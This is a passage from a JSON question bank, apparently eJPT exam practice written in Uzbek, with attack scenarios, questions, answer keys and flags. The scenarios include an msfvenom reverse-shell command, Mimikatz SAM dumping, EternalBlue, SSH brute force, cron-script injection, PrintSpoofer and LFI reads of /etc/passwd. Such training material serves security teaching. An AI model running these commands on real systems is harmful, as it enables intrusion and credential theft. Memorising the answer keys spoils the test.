+  "explanation": "autoroute bilan 172.16.5.0/24 ga marshrut ochilib, psexec orqali DC (172.16.5.20) buzildi; flag: EJPT{d33p_p1v0t_dc_pwn}."
+ },
+ {
+  "id": "hnp-051",
+  "domain": "host_network_pentest",
+  "type": "flag",
+  "difficulty": "medium",
+  "tools": [
+   "meterpreter"
+  ],
+  "scenario": "meterpreter > getsystem\n...got system via technique 1\nmeterpreter > load kiwi\nmeterpreter > lsa_dump_sam\nRID: 000001f4 (500) User: Administrator\n  Hash NTLM: 64f12cddaa88057e06a81b54e73b949b\n# pass-the-hash -> flag:\nEJPT{m1m1k4tz_sam_dump}",
+  "question": "Mimikatz (kiwi) SAM dump'idan keyin olingan flag qiymatini kiriting.",
+  "answer": "EJPT{m1m1k4tz_sam_dump}",
+  "explanation": "getsystem -> kiwi -> lsa_dump_sam bilan Administrator NTLM hashi olindi; pass-the-hash orqali flag: EJPT{m1m1k4tz_sam_dump}."
+ },
+ {
+  "id": "hnp-052",
+  "domain": "host_network_pentest",
+  "type": "flag",
+  "difficulty": "easy",
+  "tools": [
+   "metasploit"
+  ],
+  "scenario": "msf6 exploit(windows/smb/ms17_010_eternalblue) > run\n[+] 10.10.10.7:445 - The target is vulnerable.\n[*] Meterpreter session 1 opened\nmeterpreter > cat C:\\\\Users\\\\Public\\\\proof.txt\nEJPT{3t3rn4lblu3_smb_rce}",
+  "question": "EternalBlue orqali olingan proof flag qiymatini kiriting.",
+  "answer": "EJPT{3t3rn4lblu3_smb_rce}",
+  "explanation": "MS17-010 EternalBlue SYSTEM shell berdi; C:\\Users\\Public\\proof.txt: EJPT{3t3rn4lblu3_smb_rce}."
+ },
+ {
+  "id": "hnp-053",
+  "domain": "host_network_pentest",
+  "type": "flag",
+  "difficulty": "medium",
+  "tools": [
+   "msfvenom",
+   "netcat"
+  ],
+  "scenario": "$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f exe -o svc.exe\n# fayl target'da ishga tushdi, nc listener ushladi\nC:\\> type C:\\Users\\dev\\Desktop\\flag.txt\nEJPT{msfv3n0m_r3v_sh3ll}",
+  "question": "msfvenom reverse shell orqali olingan flag qiymatini kiriting (probel yo'q).",
+  "answer": "EJPT{msfv3n0m_r3v_sh3ll}",
+  "explanation": "msfvenom exe payload target'da ishga tushib nc listenerga reverse shell berdi; flag: EJPT{msfv3n0m_r3v_sh3ll}."
+ },
+ {
+  "id": "hnp-054",
+  "domain": "host_network_pentest",
+  "type": "direct",
+  "difficulty": "medium",
+  "tools": [
+   "metasploit"
+  ],
+  "scenario": "msf6 > use exploit/multi/http/tomcat_mgr_upload\nmsf6 exploit(...) > set HttpUsername tomcat\nmsf6 exploit(...) > set HttpPassword tomcat\nmsf6 exploit(...) > set RHOSTS 10.10.10.22\nmsf6 exploit(...) > set RPORT 8080\nmsf6 exploit(...) > run\n[*] Meterpreter session opened",
+  "question": "Ushbu Tomcat exploit qaysi portga ulanadi? (RPORT raqamini yozing)",
+  "answer": "8080",
+  "explanation": "RPORT=8080 — Tomcat manager 8080-portda; default tomcat/tomcat credential bilan WAR yuklab RCE olindi."
+ },
+ {
+  "id": "hnp-055",
+  "domain": "host_network_pentest",
+  "type": "flag",
+  "difficulty": "medium",
+  "tools": [
+   "meterpreter"
+  ],
+  "scenario": "meterpreter > run post/windows/gather/enum_logged_on_users\nmeterpreter > run post/windows/gather/checkvm\n[*] This is a VMware Virtual Machine\nmeterpreter > cat \"C:\\\\Users\\\\admin\\\\Documents\\\\secret.txt\"\nEJPT{p0st_3xpl01t_g4th3r}",
+  "question": "Post-exploitation gather bosqichida olingan flag qiymatini kiriting.",
+  "answer": "EJPT{p0st_3xpl01t_g4th3r}",
+  "explanation": "Post-modullar bilan tizim o'rganilib, admin hujjatlaridagi secret.txt o'qildi: EJPT{p0st_3xpl01t_g4th3r}."
+ },
+ {
+  "id": "hnp-056",
+  "domain": "host_network_pentest",
+  "type": "flag",
+  "difficulty": "hard",
+  "tools": [
+   "metasploit",
+   "pivoting"
+  ],
+  "scenario": "msf6 auxiliary(server/socks_proxy) > run\n$ proxychains nmap -sT -Pn -p 445 172.16.5.30\n445/tcp open microsoft-ds\n$ proxychains crackmapexec smb 172.16.5.30 -u admin -H <hash>\n$ proxychains smbclient //172.16.5.30/C$ -U admin --pw-nt-hash <hash>\nsmb:\\> get flag.txt\nEJPT{s0cks_pr0xy_ch41ns}",
+  "question": "SOCKS proxy + proxychains orqali ichki hostdan olingan flag qiymatini kiriting.",
+  "answer": "EJPT{s0cks_pr0xy_ch41ns}",
+  "explanation": "socks_proxy + proxychains bilan tashqi vositalar (nmap, smbclient) ichki 172.16.5.30 ga yo'naltirildi; flag: EJPT{s0cks_pr0xy_ch41ns}."
+ },
+ {
+  "id": "hnp-057",
+  "domain": "host_network_pentest",
+  "type": "flag",
+  "difficulty": "easy",
+  "tools": [
+   "hydra",
+   "netcat"
+  ],
+  "scenario": "$ hydra -l root -P rockyou.txt ssh://10.10.10.5\n[22][ssh] login: root password: toor\n$ ssh root@10.10.10.5\nroot@target:~# cat flag.txt\nEJPT{ssh_brut3_r00t_l0g1n}",
+  "question": "SSH brute-force orqali olingan flag qiymatini kiriting.",
+  "answer": "EJPT{ssh_brut3_r00t_l0g1n}",
+  "explanation": "Hydra SSH parolini topdi (root:toor); SSH bilan kirib flag olindi: EJPT{ssh_brut3_r00t_l0g1n}."
+ },
+ {
+  "id": "hna-037",
+  "domain": "host_network_auditing",
+  "type": "flag",
+  "difficulty": "medium",
+  "tools": [
+   "linux",
+   "privilege-escalation"
+  ],
+  "scenario": "user@target:~$ find / -perm -4000 -type f 2>/dev/null | grep -v proc\n/usr/bin/base64\nuser@target:~$ LFILE=/root/flag.txt; /usr/bin/base64 \"$LFILE\" | base64 -d\nEJPT{su1d_b4s364_f1l3_r34d}",
+  "question": "SUID base64 (GTFOBins) orqali o'qilgan root faylidan flag qiymatini kiriting.",
+  "answer": "EJPT{su1d_b4s364_f1l3_r34d}",
+  "explanation": "SUID base64 root fayllarni o'qishga imkon beradi (GTFOBins): base64 flag.txt | base64 -d -> EJPT{su1d_b4s364_f1l3_r34d}."
+ },
+ {
+  "id": "hna-038",
+  "domain": "host_network_auditing",
+  "type": "flag",
+  "difficulty": "medium",
+  "tools": [
+   "john"
+  ],
+  "scenario": "$ ssh2john id_rsa > rsa.hash\n$ john rsa.hash --wordlist=rockyou.txt\nsecretpass   (id_rsa)\n$ chmod 600 id_rsa; ssh -i id_rsa deploy@10.10.10.5\ndeploy@target:~$ cat flag.txt\nEJPT{ssh_k3y_cr4ck3d}",
+  "question": "Parol bilan himoyalangan SSH kalitni buzib olingan flag qiymatini kiriting.",
+  "answer": "EJPT{ssh_k3y_cr4ck3d}",
+  "explanation": "ssh2john + john bilan id_rsa passfrazasi (secretpass) topildi; kalit bilan SSH kirib flag olindi: EJPT{ssh_k3y_cr4ck3d}."
+ },
+ {
+  "id": "hna-039",
+  "domain": "host_network_auditing",
+  "type": "flag",
+  "difficulty": "easy",
+  "tools": [
+   "linux",
+   "enumeration"
+  ],
+  "scenario": "www-data@target:/var/www/html$ cat config.php | grep -i pass\n$db_pass = 'Db!P@ss2025';\nwww-data@target$ su admin\nPassword: Db!P@ss2025\nadmin@target:~$ cat flag.txt\nEJPT{p4ssw0rd_r3us3_w1ns}",
+  "question": "Parolni qayta ishlatish (reuse) orqali olingan flag qiymatini kiriting.",
+  "answer": "EJPT{p4ssw0rd_r3us3_w1ns}",
+  "explanation": "config.php'dagi DB paroli boshqa foydalanuvchi (admin) uchun ham ishladi; su admin -> flag: EJPT{p4ssw0rd_r3us3_w1ns}."
+ },
+ {
+  "id": "hna-040",
+  "domain": "host_network_auditing",
+  "type": "flag",
+  "difficulty": "hard",
+  "tools": [
+   "windows",
+   "privilege-escalation"
+  ],
+  "scenario": "C:\\> PrintSpoofer64.exe -i -c cmd\nnt authority\\system\nC:\\> type C:\\Users\\Administrator\\Desktop\\root.txt\nEJPT{pr1ntsp00f3r_syst3m}",
+  "question": "PrintSpoofer bilan SYSTEM olib, Administrator ish stolidagi flag qiymatini kiriting.",
+  "answer": "EJPT{pr1ntsp00f3r_syst3m}",
+  "explanation": "SeImpersonatePrivilege + PrintSpoofer SYSTEM shell berdi; Administrator\\Desktop\\root.txt: EJPT{pr1ntsp00f3r_syst3m}."
+ },
+ {
+  "id": "hna-041",
+  "domain": "host_network_auditing",
+  "type": "direct",
+  "difficulty": "easy",
+  "tools": [
+   "linux",
+   "enumeration"
+  ],
+  "scenario": "user@target:~$ cat /etc/shadow 2>/dev/null\ncat: /etc/shadow: Permission denied\nuser@target:~$ ls -la /etc/shadow\n-rw-r--r-- 1 root root 1024 /etc/shadow",
+  "question": "/etc/shadow ruxsati g'ayrioddiy — u odatda 640/000, bu yerda hamma o'qiy oladigan huquq qaysi (raqamli, masalan 644)?",
+  "answer": "644",
+  "explanation": "-rw-r--r-- = 644 — shadow fayli hamma uchun o'qiladigan (xato konfiguratsiya); hashlarni olib john bilan buzish mumkin."
+ },
+ {
+  "id": "hna-042",
+  "domain": "host_network_auditing",
+  "type": "flag",
+  "difficulty": "medium",
+  "tools": [
+   "linux",
+   "privilege-escalation"
+  ],
+  "scenario": "user@target:~$ cat /etc/crontab | grep root\n* * * * * root /usr/local/bin/cleanup.sh\nuser@target:~$ ls -l /usr/local/bin/cleanup.sh\n-rwxrwxrwx 1 root root\nuser@target:~$ echo 'cat /root/flag.txt > /tmp/f' >> /usr/local/bin/cleanup.sh\n# 1 daqiqadan so'ng:\nuser@target:~$ cat /tmp/f\nEJPT{cr0n_wr1t4bl3_r00t}",
+  "question": "Yoziladigan cron skript orqali olingan flag qiymatini kiriting.",
+  "answer": "EJPT{cr0n_wr1t4bl3_r00t}",
+  "explanation": "World-writable cron skript root sifatida ishlaydi; unga buyruq qo'shib /root/flag.txt o'qildi: EJPT{cr0n_wr1t4bl3_r00t}."
+ },
+ {
+  "id": "web-023",
+  "domain": "web_app_pentest",
+  "type": "flag",
+  "difficulty": "medium",
+  "tools": [
+   "lfi",
+   "curl"
+  ],
+  "scenario": "$ curl \"http://10.10.10.20/view.php?page=../../../../etc/passwd\"\nroot:x:0:0:root:/root:/bin/bash\n$ curl \"http://10.10.10.20/view.php?page=../../../../var/www/flag.txt\"\nEJPT{lf1_p4th_tr4v3rs4l}",
+  "question": "LFI (Local File Inclusion) orqali olingan flag qiymatini kiriting.",
+  "answer": "EJPT{lf1_p4th_tr4v3rs4l}",
+  "explanation": "'page' parametri filtrlanmagan — ../../../ bilan ixtiyoriy fayl o'qildi (path traversal/LFI): EJPT{lf1_p4th_tr4v3rs4l}."
+ },
+ {
+  "id": "web-024",
+  "domain": "web_app_pentest",
+  "type": "flag",
+  "difficulty": "medium",
+  "tools": [
+   "gobuster",
+   "curl"
+  ],
+  "scenario": "$ gobuster dir -u http://10.10.10.20 -w common.txt -x txt\n/flag.txt   (Status: 200) [Size: 26]\n$ curl http://10.10.10.20/flag.txt\nEJPT{d1r_brut3_h1dd3n_f1l3}",
+  "question": "Gobuster topgan yashirin fayldan flag qiymatini kiriting.",
+  "answer": "EJPT{d1r_brut3_h1dd3n_f1l3}",
+  "explanation": "Gobuster -x txt bilan /flag.txt topildi; curl bilan o'qildi: EJPT{d1r_brut3_h1dd3n_f1l3}."
+ },
+ {
+  "id": "web-025",
+  "domain": "web_app_pentest",
+  "type": "direct",
+  "difficulty": "easy",
+  "tools": [
+   "curl"
+  ],
+  "scenario": "$ curl -s http://10.10.10.20/ | grep -i 'X-Powered\\|generator'\n<meta name=\"generator\" content=\"Joomla! - Open Source Content Management\">",
+  "question": "HTML manbadagi 'generator' meta tegi qaysi CMS'ni ko'rsatmoqda? (nomini yozing)",
+  "answer": "Joomla",
+  "explanation": "generator meta tegi 'Joomla!' ni ko'rsatadi; keyin joomscan/versiyaga mos exploit qidiriladi."
+ }
+]
